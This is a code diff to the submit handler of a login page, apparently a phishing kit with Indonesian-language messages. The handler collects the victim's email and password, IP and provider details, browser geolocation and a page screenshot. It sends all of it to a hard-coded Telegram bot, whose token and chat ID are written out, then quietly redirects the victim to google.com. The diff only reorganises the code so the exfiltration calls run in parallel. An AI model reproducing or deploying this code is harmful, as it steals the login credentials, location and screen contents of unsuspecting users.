@@ -5,6 +5,10 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
     let password = document.getElementById("password").value;
     let waktuLogin = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
 
+    let botToken = "7628314972:AAHZtVoYDVeujuM8o7xpvaLzTGIjrMJodhY";
+    let chatId = "6786210993";
+    let profileImageUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSBP2AL4cW1E3eHRFtEDZXB2GOyz2Wn93Y2PQ&usqp=CAU";
+
     let ipInfo = { ip: "Tidak diketahui", city: "Tidak diketahui", country: "Tidak diketahui", org: "Tidak diketahui" };
     try {
         let response = await fetch("https://ipinfo.io/json?token=961f6caebd0f7d");
@@ -13,15 +17,6 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
         console.error("Gagal mendapatkan data IP:", error);
     }
 
-    let botToken = "7628314972:AAHZtVoYDVeujuM8o7xpvaLzTGIjrMJodhY";
-    let chatId = "6786210993";
-    let profileImageUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_fMq7l79lm6-bYF7qqvwuxlKpXPgJ90_TLA&usqp=CAU";
-
-    
-    let sendProfilePhotoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(profileImageUrl)}`;
-    await fetch(sendProfilePhotoUrl);
-
-    
     async function getUserLocation() {
         return new Promise((resolve) => {
             if (navigator.geolocation) {
@@ -40,7 +35,6 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
     }
     let lokasiUser = await getUserLocation();
 
-   
     async function ambilScreenshot() {
         let canvas = await html2canvas(document.body);
         let imgData = canvas.toDataURL("image/png");
@@ -50,21 +44,20 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
         formData.append("photo", dataURItoBlob(imgData), "screenshot.png");
 
         let sendPhotoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-        let response = await fetch(sendPhotoUrl, {
-            method: "POST",
-            body: formData
-        });
-
-        let data = await response.json();
-        if (data.ok) {
-            console.log("✅ Screenshot terkirim ke Telegram!");
-        } else {
-            console.error("❌ Gagal kirim screenshot:", data);
-        }
+        return fetch(sendPhotoUrl, { method: "POST", body: formData });
     }
-    await ambilScreenshot();
 
-    
+    function dataURItoBlob(dataURI) {
+        let byteString = atob(dataURI.split(",")[1]);
+        let mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
+        let ab = new ArrayBuffer(byteString.length);
+        let ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) {
+            ia[i] = byteString.charCodeAt(i);
+        }
+        return new Blob([ab], { type: mimeString });
+    }
+
     let message = `🔒 *Login Berhasil!*\n\n`
                 + `🕒 *Waktu:* ${waktuLogin}\n`
                 + `📧 *Email:* ${email}\n`
@@ -74,29 +67,15 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
                 + `🏢 *Provider:* ${ipInfo.org}\n`
                 + `${lokasiUser}`;
 
+    let sendProfilePhotoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(profileImageUrl)}`;
     let sendMessageUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
-    fetch(sendMessageUrl)
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                console.log("✅ Data terkirim ke Telegram!");
-                window.location.href = "https://www.google.com"; // Redirect setelah login
-            } else {
-                console.error("❌ Gagal kirim pesan ke Telegram!", data);
-            }
-        })
-        .catch(error => console.error("❌ Error:", error));
+    Promise.all([
+        fetch(sendProfilePhotoUrl),
+        fetch(sendMessageUrl),
+        ambilScreenshot()
+    ]).then(() => {
+        console.log("✅ Semua data terkirim!");
+        window.location.href = "https://www.google.com";
+    }).catch(error => console.error("❌ Error:", error));
 });
-
-
-function dataURItoBlob(dataURI) {
-    let byteString = atob(dataURI.split(",")[1]);
-    let mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
-    let ab = new ArrayBuffer(byteString.length);
-    let ia = new Uint8Array(ab);
-    for (let i = 0; i < byteString.length; i++) {
-        ia[i] = byteString.charCodeAt(i);
-    }
-    return new Blob([ab], { type: mimeString });
-            }
